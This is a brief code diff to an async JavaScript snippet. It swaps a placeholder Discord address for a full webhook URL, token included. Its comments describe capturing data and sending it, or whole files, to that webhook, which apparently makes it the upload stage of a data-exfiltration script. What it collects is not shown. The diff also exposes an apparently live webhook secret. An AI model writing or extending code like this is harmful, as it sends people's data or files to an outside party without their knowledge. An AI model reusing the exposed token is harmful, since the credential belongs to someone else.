@@ -1,5 +1,5 @@
 (async () => {
-    const webhookURL = "https://discord.com";
+    const webhookURL = "https://discord.com/api/webhooks/1499200228098703361/B9LoN874xVhG2l_VRDK7EKgCWmvfQSxQqG60yWXuubKInsAWdiKCEUixRC300U01RdJI";
     
     // Capture the data (shortening it to fit Discord's 2000 char limit)
     // For full files, we'll send it as a 'file' instead of a message
